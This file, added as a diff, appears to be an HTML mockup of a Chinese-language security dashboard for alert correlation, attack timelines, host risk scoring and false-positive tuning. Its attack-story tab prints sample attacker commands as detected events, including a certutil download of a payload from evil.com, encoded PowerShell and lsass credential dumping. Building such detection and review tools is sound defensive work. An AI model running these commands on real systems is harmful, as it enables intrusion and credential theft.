@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI 实验室 — 优化界面预览</title>
+<script src="https://cdn.jsdelivr.net/npm/echarts@5.5.0/dist/echarts.min.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, "Segoe UI", sans-serif; background: #f5f6fa; color: #1f2937; font-size: 13px; }
+
+/* ── 页面框架 ── */
+.page { max-width: 1200px; margin: 0 auto; padding: 16px 20px; }
+.page-head { display: flex; align-items: baseline; gap: 8px; margin-bottom: 8px; }
+.page-head h1 { font-size: 20px; font-weight: 700; margin: 0; }
+.page-head span { font-size: 12px; color: #6b7280; }
+
+/* ── Tab 栏 ── */
+.tabs { display: flex; gap: 0; background: #f3f4f6; border-radius: 8px; padding: 3px; width: fit-content; margin-bottom: 14px; }
+.tab { padding: 6px 16px; border-radius: 5px; cursor: pointer; font-size: 12px; color: #6b7280; white-space: nowrap; }
+.tab.active { background: #fff; color: #1f2937; font-weight: 600; box-shadow: 0 1px 3px rgba(0,0,0,.06); }
+
+/* ── 内容区 ── */
+section { display: none; }
+section.active { display: block; }
+.card { background: #fff; border: 1px solid #e5e7eb; border-radius: 10px; padding: 16px; margin-bottom: 12px; }
+.card-title { font-size: 14px; font-weight: 600; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
+
+/* ── Tab 1: 自然语言 ── */
+.chat-widget { display: flex; gap: 16px; }
+.chat-panel { flex: 1; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden; background: #fff; }
+.chat-msgs { padding: 14px; max-height: 340px; overflow-y: auto; background: #f9fafb; }
+.msg { display: flex; gap: 10px; margin-bottom: 12px; }
+.msg-av { font-size: 20px; flex-shrink: 0; }
+.msg-b { background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 10px 14px; max-width: 80%; font-size: 12px; line-height: 1.6; }
+.msg.user .msg-b { background: #ecfdf5; border-color: #a7f3d0; }
+.chat-in { display: flex; padding: 10px 12px; border-top: 1px solid #e5e7eb; gap: 6px; }
+.chat-in input { flex: 1; border: 1px solid #e5e7eb; border-radius: 6px; padding: 8px 12px; font-size: 12px; outline: none; }
+.chat-in input:focus { border-color: #059669; }
+.chat-in button { background: #059669; color: #fff; border: none; border-radius: 6px; padding: 8px 16px; font-size: 12px; cursor: pointer; }
+
+/* ── 结果展示区 ── */
+.result-panel { width: 400px; min-width: 400px; display: flex; flex-direction: column; gap: 8px; }
+.stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+.stat-card { background: #f9fafb; border-radius: 8px; padding: 12px; text-align: center; }
+.stat-card .n { font-size: 26px; font-weight: 700; }
+.stat-card .l { font-size: 11px; color: #6b7280; margin-top: 2px; }
+.stat-card.critical .n { color: #dc2626; }
+.stat-card.high .n { color: #d97706; }
+.stat-card.info .n { color: #2563eb; }
+
+.alert-mini { display: flex; align-items: center; gap: 8px; background: #fff; border: 1px solid #e5e7eb; border-radius: 6px; padding: 8px 10px; }
+.alert-mini .sev-dot { width: 8px; height: 8px; border-radius: 50%; }
+.alert-mini .sev-dot.critical { background: #dc2626; }
+.alert-mini .sev-dot.high { background: #d97706; }
+.alert-mini .sev-dot.medium { background: #3b82f6; }
+.alert-mini .a-title { flex: 1; font-size: 12px; }
+.alert-mini .a-time { font-size: 10px; color: #9ca3af; }
+
+.kpi-row { display: flex; gap: 8px; margin-bottom: 12px; }
+.kpi { flex: 1; background: #f9fafb; border-radius: 8px; padding: 12px; text-align: center; }
+.kpi .n { font-size: 22px; font-weight: 700; }
+.kpi .l { font-size: 11px; color: #6b7280; margin-top: 2px; }
+.kpi.red .n { color: #dc2626; }
+.kpi.amber .n { color: #d97706; }
+.kpi.blue .n { color: #2563eb; }
+.kpi.green .n { color: #059669; }
+
+/* ── Tab 2: 告警降噪 ── */
+.events-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 10px; }
+.event-card { background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 14px; }
+.event-card .ec-head { display: flex; justify-content: space-between; align-items: flex-start; }
+.event-card .ec-title { font-size: 13px; font-weight: 600; flex: 1; }
+.event-card .ec-badges { display: flex; gap: 4px; flex-wrap: wrap; margin: 6px 0; }
+.badge { display: inline-block; padding: 1px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; }
+.badge.critical { background: #fee2e2; color: #dc2626; }
+.badge.high { background: #fef3c7; color: #92400e; }
+.badge.medium { background: #dbeafe; color: #1e40af; }
+.badge.stage { background: #f3f4f6; color: #374151; }
+.badge.stage-danger { background: #fee2e2; color: #dc2626; }
+.badge.stage-warn { background: #fef3c7; color: #92400e; }
+.badge.stage-blue { background: #dbeafe; color: #1e40af; }
+.event-card .ec-info { display: flex; gap: 12px; font-size: 11px; color: #6b7280; margin-top: 6px; }
+
+.chart-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.chart-box { background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 12px; }
+.chart-box .ch { font-size: 12px; font-weight: 600; margin-bottom: 4px; }
+.chart-box .c-body { height: 120px; }
+
+/* ── Tab 3: 攻击故事 ── */
+.story-layout { display: flex; gap: 16px; }
+.story-nav { width: 160px; min-width: 160px; background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 10px; height: fit-content; position: sticky; top: 10px; }
+.story-nav .sn-title { font-size: 11px; color: #9ca3af; margin-bottom: 6px; }
+.story-nav .sn-item { padding: 5px 8px; border-radius: 4px; font-size: 12px; cursor: pointer; margin-bottom: 2px; }
+.story-nav .sn-item:hover, .story-nav .sn-item.active { background: #ecfdf5; color: #059669; }
+.story-content { flex: 1; background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 16px; max-height: 540px; overflow-y: auto; }
+.story-content .s-header { font-size: 18px; font-weight: 700; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+.story-phase { margin-bottom: 14px; }
+.story-phase .sp-tag { display: inline-flex; align-items: center; gap: 4px; padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; margin-bottom: 6px; }
+.story-phase .sp-item { padding: 4px 0 4px 14px; border-left: 2px solid #e5e7eb; margin-left: 6px; font-size: 12px; color: #4b5563; line-height: 1.5; }
+.story-actions { margin-top: 12px; padding-top: 12px; border-top: 1px solid #e5e7eb; }
+.act-item { display: flex; align-items: center; gap: 8px; padding: 6px 0; font-size: 12px; cursor: pointer; }
+.act-item .chk { width: 16px; height: 16px; border-radius: 4px; border: 2px solid #d1d5db; cursor: pointer; }
+.act-item .chk.done { background: #059669; border-color: #059669; position: relative; }
+.act-item .chk.done::after { content: '✓'; color: #fff; font-size: 10px; position: absolute; left: 2px; top: -1px; }
+
+/* ── Tab 4: 预测预警 ── */
+.rank-table { width: 100%; border-collapse: collapse; }
+.rank-table th { text-align: left; padding: 8px 12px; font-size: 11px; font-weight: 600; color: #6b7280; border-bottom: 1px solid #e5e7eb; background: #f9fafb; }
+.rank-table td { padding: 8px 12px; font-size: 12px; border-bottom: 1px solid #f3f4f6; }
+.rank-table tr:hover td { background: #f9fafb; }
+.bar-bg { height: 8px; border-radius: 4px; background: #f3f4f6; overflow: hidden; width: 120px; display: inline-block; vertical-align: middle; }
+.bar-fill { height: 100%; border-radius: 4px; }
+.bar-fill.critical { background: linear-gradient(90deg, #dc2626, #ef4444); }
+.bar-fill.high { background: linear-gradient(90deg, #d97706, #f59e0b); }
+.bar-fill.medium { background: linear-gradient(90deg, #3b82f6, #60a5fa); }
+.bar-fill.low { background: linear-gradient(90deg, #6b7280, #9ca3af); }
+
+.risk-charts { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
+.r-chart { background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 12px; }
+.r-chart .rc-title { font-size: 12px; font-weight: 600; margin-bottom: 4px; }
+.r-chart .rc-body { height: 120px; }
+
+/* ── Tab 5: 误报 ── */
+.fp-search { display: flex; gap: 6px; margin-bottom: 10px; }
+.fp-search input { border: 1px solid #e5e7eb; border-radius: 6px; padding: 6px 10px; font-size: 12px; outline: none; flex: 1; }
+.fp-search select { border: 1px solid #e5e7eb; border-radius: 6px; padding: 6px 10px; font-size: 12px; outline: none; background: #fff; }
+.fp-stats { display: flex; gap: 8px; margin-bottom: 10px; }
+.fp-stat { flex: 1; background: #f9fafb; border-radius: 8px; padding: 10px; text-align: center; }
+.fp-stat .n { font-size: 18px; font-weight: 700; color: #059669; }
+.fp-stat .l { font-size: 11px; color: #6b7280; }
+
+/* ── 提示条 ── */
+.tip { padding: 10px 14px; background: #f0f9ff; border-left: 3px solid #3b82f6; border-radius: 0 6px 6px 0; font-size: 11px; color: #1e40af; line-height: 1.5; margin-top: 8px; }
+</style>
+</head>
+<body>
+<div class="page">
+  <div class="page-head">
+    <h1>🧪 AI 实验室</h1>
+    <span>优化版 · 高级关联功能 · 智能辅助分析与研判</span>
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" data-tab="chat">💬 自然语言指挥台</div>
+    <div class="tab" data-tab="correlate">📊 告警降噪</div>
+    <div class="tab" data-tab="story">📖 攻击故事</div>
+    <div class="tab" data-tab="risk">🎯 预测预警</div>
+    <div class="tab" data-tab="fp">✅ 误报管理</div>
+  </div>
+
+  <!-- ================================================================ -->
+  <!-- TAB 1: 自然语言指挥台 -->
+  <!-- ================================================================ -->
+  <section id="chat" class="active">
+    <div class="chat-widget">
+      <div class="chat-panel">
+        <div class="chat-msgs">
+          <div class="msg user">
+            <div class="msg-av">👤</div>
+            <div class="msg-b">统计信息</div>
+          </div>
+          <div class="msg">
+            <div class="msg-av">🤖</div>
+            <div class="msg-b">
+              <div style="margin-bottom:8px">📌 意图识别: stats</div>
+              <div class="stat-grid">
+                <div class="stat-card info"><div class="n">16,743</div><div class="l">📦 总日志</div></div>
+                <div class="stat-card high"><div class="n">187</div><div class="l">🚨 总告警</div></div>
+                <div class="stat-card critical"><div class="n">161</div><div class="l">🔴 未处理</div></div>
+                <div class="stat-card"><div class="n" style="color:#059669">38</div><div class="l">🖥 监控主机</div></div>
+              </div>
+            </div>
+          </div>
+          <div class="msg user">
+            <div class="msg-av">👤</div>
+            <div class="msg-b">严重的告警</div>
+          </div>
+          <div class="msg">
+            <div class="msg-av">🤖</div>
+            <div class="msg-b">
+              <div style="margin-bottom:6px">📌 共 26 条严重告警</div>
+              <div class="alert-mini"><span class="sev-dot critical"></span><span class="a-title">WebShell 检测 — host 8</span><span class="a-time">13:38</span></div>
+              <div class="alert-mini"><span class="sev-dot critical"></span><span class="a-title">known_bad_ip 命中 — host 8, 17</span><span class="a-time">13:38</span></div>
+              <div class="alert-mini"><span class="sev-dot critical"></span><span class="a-title">EVENT-PROCESS-CREATE — host 1</span><span class="a-time">23:18</span></div>
+              <div style="margin-top:6px;font-size:11px;color:#6b7280">👉 点击告警跳转到告警中心查看详情</div>
+            </div>
+          </div>
+        </div>
+        <div class="chat-in">
+          <input placeholder="输入问题：严重的告警、统计信息、主机状态...">
+          <button>提问</button>
+        </div>
+      </div>
+      <div class="result-panel">
+        <div class="card" style="padding:12px">
+          <div class="card-title" style="margin-bottom:6px">⚡ 快速查询</div>
+          <div style="display:flex;flex-wrap:wrap;gap:4px">
+            <span style="padding:2px 10px;background:#ecfdf5;border-radius:12px;font-size:11px;color:#065f46;cursor:pointer">严重的告警</span>
+            <span style="padding:2px 10px;background:#fef3c7;border-radius:12px;font-size:11px;color:#92400e;cursor:pointer">统计信息</span>
+            <span style="padding:2px 10px;background:#dbeafe;border-radius:12px;font-size:11px;color:#1e40af;cursor:pointer">在线主机</span>
+            <span style="padding:2px 10px;background:#f3f4f6;border-radius:12px;font-size:11px;color:#374151;cursor:pointer">登录失败的日志</span>
+            <span style="padding:2px 10px;background:#fee2e2;border-radius:12px;font-size:11px;color:#dc2626;cursor:pointer">查看策略</span>
+            <span style="padding:2px 10px;background:#f3f4f6;border-radius:12px;font-size:11px;cursor:pointer">未结案件</span>
+          </div>
+        </div>
+        <div class="card" style="padding:12px">
+          <div class="card-title" style="margin-bottom:6px">📊 实时快照</div>
+          <div class="kpi-row" style="margin-bottom:0">
+            <div class="kpi red"><div class="n">26</div><div class="l">严重告警</div></div>
+            <div class="kpi amber"><div class="n">161</div><div class="l">待处理</div></div>
+            <div class="kpi blue"><div class="n">38</div><div class="l">主机</div></div>
+            <div class="kpi green"><div class="n">1</div><div class="l">激活策略</div></div>
+          </div>
+        </div>
+        <div class="tip">💡 支持 6 种查询：告警 / 日志 / 主机 / 案件 / 统计 / 策略。结果从表格/卡片形式呈现，不再返回 JSON。</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================================================================ -->
+  <!-- TAB 2: 告警降噪 -->
+  <!-- ================================================================ -->
+  <section id="correlate">
+    <div class="kpi-row">
+      <div class="kpi red"><div class="n">41</div><div class="l">归并事件</div></div>
+      <div class="kpi amber"><div class="n">187</div><div class="l">原始告警</div></div>
+      <div class="kpi green"><div class="n">78%</div><div class="l">降噪率</div></div>
+      <div class="kpi blue"><div class="n">5</div><div class="l">攻击阶段</div></div>
+    </div>
+
+    <div class="chart-row">
+      <div class="chart-box">
+        <div class="ch">🎯 攻击阶段分布</div>
+        <div class="c-body" id="stageChart"></div>
+      </div>
+      <div class="chart-box">
+        <div class="ch">🚨 事件严重度分布</div>
+        <div class="c-body" id="sevChart"></div>
+      </div>
+    </div>
+
+    <div class="events-grid" style="margin-top:12px">
+      <div class="event-card">
+        <div class="ec-head">
+          <div class="ec-title">🔑 外连C2: suspicious_c2_domain</div>
+          <span class="badge critical">严重</span>
+        </div>
+        <div class="ec-badges">
+          <span class="badge stage-danger">🌐 外连C2</span>
+          <span class="badge">2026-07-13</span>
+        </div>
+        <div class="ec-info">
+          <span>📡 2 次告警</span>
+          <span>🖥 2 台主机</span>
+          <span>⏱ 01:37~01:38</span>
+        </div>
+        <div style="margin-top:6px;font-size:11px;color:#6b7280;border-top:1px solid #f3f4f6;padding-top:6px">
+          涉及 MITRE: T1071 · 建议: 隔离受影响主机
+        </div>
+      </div>
+      <div class="event-card">
+        <div class="ec-head">
+          <div class="ec-title">📦 持久化驻留: suspicious_scheduled_task</div>
+          <span class="badge high">高危</span>
+        </div>
+        <div class="ec-badges">
+          <span class="badge stage-warn">📦 持久化</span>
+          <span class="badge">2026-07-13</span>
+        </div>
+        <div class="ec-info">
+          <span>📡 21 次告警</span>
+          <span>🖥 22 台主机</span>
+          <span>⏱ 01:38</span>
+        </div>
+        <div style="margin-top:6px;font-size:11px;color:#6b7280;border-top:1px solid #f3f4f6;padding-top:6px">
+          建议: 全面排查所有受影响主机的计划任务
+        </div>
+      </div>
+      <div class="event-card">
+        <div class="ec-head">
+          <div class="ec-title">⚡ 初始入侵: 暴破登录</div>
+          <span class="badge critical">严重</span>
+        </div>
+        <div class="ec-badges">
+          <span class="badge stage-danger">⚡ 初始入侵</span>
+          <span class="badge">2026-07-13</span>
+        </div>
+        <div class="ec-info">
+          <span>📡 8 次告警</span>
+          <span>🖥 1 台主机</span>
+          <span>⏱ 08:45~08:50</span>
+        </div>
+        <div style="margin-top:6px;font-size:11px;color:#6b7280;border-top:1px solid #f3f4f6;padding-top:6px">
+          🚨 来源 IP: 192.168.1.200 · 涉及 MITRE: T1110
+        </div>
+      </div>
+      <div class="event-card">
+        <div class="ec-head">
+          <div class="ec-title">🎯 凭据窃取: mimikatz 检测</div>
+          <span class="badge critical">严重</span>
+        </div>
+        <div class="ec-badges">
+          <span class="badge stage-danger">🎯 凭据窃取</span>
+          <span class="badge">2026-07-13</span>
+        </div>
+        <div class="ec-info">
+          <span>📡 3 次告警</span>
+          <span>🖥 1 台主机</span>
+          <span>⏱ 08:52</span>
+        </div>
+        <div style="margin-top:6px;font-size:11px;color:#6b7280;border-top:1px solid #f3f4f6;padding-top:6px">
+          🚨 涉及 MITRE: T1003 · 建议: 重置凭据
+        </div>
+      </div>
+    </div>
+    <div style="margin-top:8px;display:flex;gap:6px;align-items:center">
+      <span style="font-size:12px;color:#6b7280">🖥 筛选主机:</span>
+      <select style="border:1px solid #e5e7eb;border-radius:6px;padding:4px 8px;font-size:12px">
+        <option>全部主机</option>
+        <option>WEB-SRV-01</option>
+        <option>DB-01</option>
+      </select>
+      <button style="background:#059669;color:#fff;border:none;border-radius:6px;padding:5px 14px;font-size:12px;cursor:pointer">🔄 执行归并</button>
+    </div>
+  </section>
+
+  <!-- ================================================================ -->
+  <!-- TAB 3: 攻击故事 -->
+  <!-- ================================================================ -->
+  <section id="story">
+    <div style="display:flex;gap:8px;margin-bottom:12px">
+      <select style="border:1px solid #e5e7eb;border-radius:6px;padding:6px 12px;font-size:12px">
+        <option>WEB-SRV-01 (host 8)</option>
+        <option>DB-01 (host 7)</option>
+      </select>
+      <button style="background:#059669;color:#fff;border:none;border-radius:6px;padding:6px 16px;font-size:12px;cursor:pointer">📖 生成故事</button>
+      <div style="margin-left:auto;display:flex;gap:4px;align-items:center">
+        <span style="font-size:11px;color:#6b7280">模式:</span>
+        <span style="padding:2px 10px;background:#059669;color:#fff;border-radius:12px;font-size:11px;cursor:pointer">详细</span>
+        <span style="padding:2px 10px;background:#f3f4f6;border-radius:12px;font-size:11px;cursor:pointer">简短</span>
+      </div>
+    </div>
+
+    <div class="story-layout">
+      <div class="story-nav">
+        <div class="sn-title">📑 故事章节</div>
+        <div class="sn-item active">📋 案件概要</div>
+        <div class="sn-item">🔑 初始入侵 (08:45)</div>
+        <div class="sn-item">⚡ 代码执行 (08:47)</div>
+        <div class="sn-item">📦 持久化驻留 (08:50)</div>
+        <div class="sn-item">🎯 凭据窃取 (08:52)</div>
+        <div class="sn-item">🌐 C2 通信 (08:55)</div>
+        <div class="sn-item">🧹 痕迹清理 (09:20)</div>
+        <div class="sn-item">💡 建议措施</div>
+      </div>
+
+      <div class="story-content">
+        <div class="s-header">
+          🛡️ WEB-SRV-01 攻击事件复盘
+          <span style="font-size:11px;background:#fee2e2;color:#dc2626;padding:2px 8px;border-radius:4px">严重</span>
+          <span style="font-size:11px;background:#f3f4f6;color:#6b7280;padding:2px 8px;border-radius:4px">2026-07-13</span>
+        </div>
+
+        <div class="tip" style="margin-bottom:12px">📌 攻击者于 08:45 通过暴破获取管理员权限，经代码执行→持久化→凭据窃取→C2通信后于 09:20 清除审计日志。覆盖 MITRE ATT&CK 5 个战术阶段。</div>
+
+        <div class="story-phase">
+          <div class="sp-tag" style="background:#fee2e2;color:#dc2626">🔑 初始入侵 · 08:45</div>
+          <div class="sp-item">4672 — 管理员登录 (来源 IP: 192.168.1.200)</div>
+          <div class="sp-item">4624 — 登录成功 · 帐户: Administrator</div>
+        </div>
+
+        <div class="story-phase">
+          <div class="sp-tag" style="background:#fef3c7;color:#92400e">⚡ 代码执行 · 08:47</div>
+          <div class="sp-item">4688 — 进程创建: powershell.exe -enc SQBFA...</div>
+          <div class="sp-item">4688 — 进程创建: certutil.exe -urlcache http://evil.com/payload.exe</div>
+        </div>
+
+        <div class="story-phase">
+          <div class="sp-tag" style="background:#fef3c7;color:#92400e">📦 持久化驻留 · 08:50</div>
+          <div class="sp-item">4698 — 计划任务创建 (schtasks /create /sc onstart /tn Updater)</div>
+          <div class="sp-item">7045 — 服务安装: WindowsUpdateService</div>
+        </div>
+
+        <div class="story-phase">
+          <div class="sp-tag" style="background:#fee2e2;color:#dc2626">🎯 凭据窃取 · 08:52</div>
+          <div class="sp-item">进程: procdump.exe -ma lsass.exe (检测到凭据转储行为)</div>
+        </div>
+
+        <div class="story-phase">
+          <div class="sp-tag" style="background:#fee2e2;color:#dc2626">🌐 C2 通信 · 08:55</div>
+          <div class="sp-item">5156 — 外连 203.0.113.42:443 (C2 服务器)</div>
+          <div class="sp-item">5156 — 外连 185.220.101.1:8443 (备用 C2)</div>
+        </div>
+
+        <div class="story-phase">
+          <div class="sp-tag" style="background:#6b7280;color:#fff">🧹 痕迹清理 · 09:20</div>
+          <div class="sp-item">🚨 1102 — 审计日志清除</div>
+        </div>
+
+        <div class="story-actions">
+          <div style="font-weight:600;margin-bottom:6px">💡 建议措施</div>
+          <div class="act-item"><span class="chk" onclick="this.classList.toggle('done')"></span>立即隔离主机 WEB-SRV-01</div>
+          <div class="act-item"><span class="chk" onclick="this.classList.toggle('done')"></span>封禁来源 IP 192.168.1.200</div>
+          <div class="act-item"><span class="chk" onclick="this.classList.toggle('done')"></span>清除计划任务 Updater 和恶意服务</div>
+          <div class="act-item"><span class="chk done"></span>收集 payload.exe 样本送检</div>
+          <div class="act-item"><span class="chk" onclick="this.classList.toggle('done')"></span>重置受影响帐户凭据</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================================================================ -->
+  <!-- TAB 4: 预测预警 -->
+  <!-- ================================================================ -->
+  <section id="risk">
+    <div style="display:flex;gap:8px;align-items:center;margin-bottom:12px">
+      <button style="background:#059669;color:#fff;border:none;border-radius:6px;padding:6px 16px;font-size:12px;cursor:pointer">🔄 刷新排行</button>
+      <span style="font-size:12px;color:#6b7280">共 <strong>38</strong> 台主机 · 最后更新: 2026-07-13 15:00</span>
+    </div>
+
+    <div class="rank-table-wrap" style="background:#fff;border:1px solid #e5e7eb;border-radius:8px;overflow:hidden">
+      <table class="rank-table">
+        <thead>
+          <tr><th style="width:40px">#</th><th>主机名</th><th style="width:100px">IP</th><th style="width:160px">风险评分</th><th style="width:80px">等级</th><th style="width:60px">状态</th><th style="width:140px">操作</th></tr>
+        </thead>
+        <tbody>
+          <tr><td style="font-weight:700;color:#dc2626">1</td><td style="font-weight:600">FULL-COMPROMISE</td><td>—</td><td><span class="bar-bg"><span class="bar-fill critical" style="width:85%"></span></span> <span style="font-weight:700;color:#dc2626;margin-left:4px">85</span></td><td><span class="badge critical">严重</span></td><td>analyzed</td><td><span style="color:#2563eb;cursor:pointer">📊 查看详情</span></td></tr>
+          <tr><td>2</td><td style="font-weight:600">WEB-SRV-PHP</td><td>—</td><td><span class="bar-bg"><span class="bar-fill high" style="width:65%"></span></span> <span style="font-weight:700;color:#d97706;margin-left:4px">65</span></td><td><span class="badge high">高危</span></td><td>analyzed</td><td><span style="color:#2563eb;cursor:pointer">📊 查看详情</span></td></tr>
+          <tr><td>3</td><td style="font-weight:600">DESKTOP-NCR4EED (host 2)</td><td>—</td><td><span class="bar-bg"><span class="bar-fill high" style="width:60%"></span></span> <span style="font-weight:700;color:#d97706;margin-left:4px">60</span></td><td><span class="badge high">高危</span></td><td>analyzed</td><td><span style="color:#2563eb;cursor:pointer">📊 查看详情</span></td></tr>
+          <tr><td>4</td><td style="font-weight:600">WIN-N24BQS1PVL7</td><td>—</td><td><span class="bar-bg"><span class="bar-fill high" style="width:50%"></span></span> <span style="font-weight:700;color:#d97706;margin-left:4px">50</span></td><td><span class="badge high">高危</span></td><td>analyzed</td><td><span style="color:#2563eb;cursor:pointer">📊 查看详情</span></td></tr>
+          <tr><td>5</td><td style="font-weight:600">APP-SRV-TOMCAT</td><td>—</td><td><span class="bar-bg"><span class="bar-fill medium" style="width:30%"></span></span> <span style="font-weight:700;color:#3b82f6;margin-left:4px">30</span></td><td><span class="badge medium">中危</span></td><td>analyzed</td><td><span style="color:#2563eb;cursor:pointer">📊 查看详情</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="risk-charts">
+      <div class="r-chart">
+        <div class="rc-title">📊 TOP 5 风险对比</div>
+        <div class="rc-body" id="top5Chart"></div>
+      </div>
+      <div class="r-chart">
+        <div class="rc-title">🧩 FULL-COMPROMISE 评分维度下钻</div>
+        <div class="rc-body" id="drillChart"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================================================================ -->
+  <!-- TAB 5: 误报管理 -->
+  <!-- ================================================================ -->
+  <section id="fp">
+    <div class="fp-stats">
+      <div class="fp-stat"><div class="n">12</div><div class="l">📝 已学习模式</div></div>
+      <div class="fp-stat"><div class="n">47</div><div class="l">🚫 已拦截告警</div></div>
+      <div class="fp-stat"><div class="n">6</div><div class="l">🎯 受影响规则</div></div>
+      <div class="fp-stat"><div class="n">22%</div><div class="l">📉 告警降噪率</div></div>
+    </div>
+
+    <div class="fp-search">
+      <input placeholder="🔍 搜索规则名...">
+      <select><option>全部进程</option><option>backup_script.exe</option><option>svchost.exe</option></select>
+      <select><option>全部主机</option><option>host 2</option><option>host 8</option></select>
+      <button style="background:#059669;color:#fff;border:none;border-radius:6px;padding:6px 14px;font-size:12px;cursor:pointer">搜索</button>
+      <button style="border:1px solid #e5e7eb;border-radius:6px;padding:6px 14px;font-size:12px;background:#fff;cursor:pointer">重置</button>
+    </div>
+
+    <div style="background:#fff;border:1px solid #e5e7eb;border-radius:8px;overflow:hidden">
+      <table class="rank-table">
+        <thead>
+          <tr><th style="width:30px"><input type="checkbox"></th><th>规则</th><th>进程</th><th>主机ID</th><th>原因</th><th style="width:60px">命中</th><th style="width:140px">时间</th><th style="width:60px">操作</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><input type="checkbox"></td><td>scheduled_task_create</td><td>backup_script.exe</td><td>8</td><td>运维定期执行脚本</td><td>23</td><td>2026-07-13 14:30</td><td><span style="color:#dc2626;cursor:pointer">删除</span></td></tr>
+          <tr><td><input type="checkbox"></td><td>high_connection_count</td><td>svchost.exe</td><td>2</td><td>Windows Update 正常行为</td><td>12</td><td>2026-07-13 13:15</td><td><span style="color:#dc2626;cursor:pointer">删除</span></td></tr>
+          <tr><td><input type="checkbox"></td><td>unsigned_process</td><td>chrome.exe</td><td>4</td><td>开发工具签名延迟</td><td>8</td><td>2026-07-13 12:00</td><td><span style="color:#dc2626;cursor:pointer">删除</span></td></tr>
+          <tr><td><input type="checkbox"></td><td>process_respawn_loop</td><td>monitor.exe</td><td>10</td><td>监控软件自动重启</td><td>4</td><td>2026-07-13 11:20</td><td><span style="color:#dc2626;cursor:pointer">删除</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div style="margin-top:8px;display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#6b7280">
+      <span>显示 1-4 条 / 共 12 条</span>
+      <div style="display:flex;gap:4px">
+        <button style="padding:3px 10px;border:1px solid #e5e7eb;border-radius:4px;background:#fff;cursor:pointer;font-size:11px">上一页</button>
+        <button style="padding:3px 10px;border:1px solid #059669;border-radius:4px;background:#059669;color:#fff;cursor:pointer;font-size:11px">1</button>
+        <button style="padding:3px 10px;border:1px solid #e5e7eb;border-radius:4px;background:#fff;cursor:pointer;font-size:11px">2</button>
+        <button style="padding:3px 10px;border:1px solid #e5e7eb;border-radius:4px;background:#fff;cursor:pointer;font-size:11px">下一页</button>
+      </div>
+    </div>
+  </section>
+</div>
+
+<script>
+// Tab switching
+document.querySelectorAll('.tab').forEach(t => {
+  t.addEventListener('click', function() {
+    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+    document.querySelectorAll('section').forEach(x => x.classList.remove('active'));
+    this.classList.add('active');
+    document.getElementById(this.dataset.tab).classList.add('active');
+    setTimeout(renderCharts, 100);
+  });
+});
+
+function renderCharts() {
+  // Stage pie chart
+  const stageChart = echarts.init(document.getElementById('stageChart'));
+  stageChart.setOption({
+    tooltip: { trigger: 'item', formatter: '{b}: {c} ({d}%)' },
+    series: [{
+      type: 'pie', radius: ['40%','65%'], center: ['50%','48%'],
+      itemStyle: { borderRadius: 3, borderColor: '#fff', borderWidth: 2 },
+      label: { show: true, fontSize: 9, formatter: '{b}\n{d}%' },
+      data: [
+        { name: '初始入侵', value: 3, itemStyle: { color: '#dc2626' } },
+        { name: '代码执行', value: 5, itemStyle: { color: '#f59e0b' } },
+        { name: '持久化', value: 8, itemStyle: { color: '#f97316' } },
+        { name: '凭据窃取', value: 2, itemStyle: { color: '#ef4444' } },
+        { name: '外连C2', value: 4, itemStyle: { color: '#7c3aed' } },
+        { name: '防御绕过', value: 1, itemStyle: { color: '#6b7280' } },
+        { name: '通用', value: 18, itemStyle: { color: '#3b82f6' } },
+      ]
+    }]
+  });
+
+  // Severity bar chart
+  const sevChart = echarts.init(document.getElementById('sevChart'));
+  sevChart.setOption({
+    tooltip: { trigger: 'axis' },
+    grid: { left: 30, right: 8, top: 6, bottom: 20 },
+    xAxis: { type: 'category', data: ['严重', '高危', '中危'], axisLabel: { fontSize: 10 } },
+    yAxis: { type: 'value', axisLabel: { fontSize: 9 } },
+    series: [{
+      type: 'bar', barWidth: '50%',
+      data: [
+        { value: 7, itemStyle: { color: '#dc2626' } },
+        { value: 28, itemStyle: { color: '#f59e0b' } },
+        { value: 6, itemStyle: { color: '#3b82f6' } },
+      ],
+      label: { show: true, position: 'top', fontSize: 10 }
+    }]
+  });
+
+  // Top5 bar chart
+  const top5 = echarts.init(document.getElementById('top5Chart'));
+  top5.setOption({
+    tooltip: { trigger: 'axis' },
+    grid: { left: 80, right: 8, top: 6, bottom: 20 },
+    xAxis: { type: 'value', max: 100, axisLabel: { fontSize: 9 } },
+    yAxis: { type: 'category', data: ['FULL-COMPROMISE', 'WEB-SRV-PHP', 'DESKTOP-NCR4EED', 'WIN-N24BQS1PVL7', 'APP-SRV-TOMCAT'], axisLabel: { fontSize: 9 } },
+    series: [{
+      type: 'bar', barWidth: '60%',
+      data: [
+        { value: 85, itemStyle: { color: '#dc2626' } },
+        { value: 65, itemStyle: { color: '#f59e0b' } },
+        { value: 60, itemStyle: { color: '#f59e0b' } },
+        { value: 50, itemStyle: { color: '#f59e0b' } },
+        { value: 30, itemStyle: { color: '#3b82f6' } },
+      ],
+      label: { show: true, position: 'right', fontSize: 10 }
+    }]
+  });
+
+  // Drill-down radar
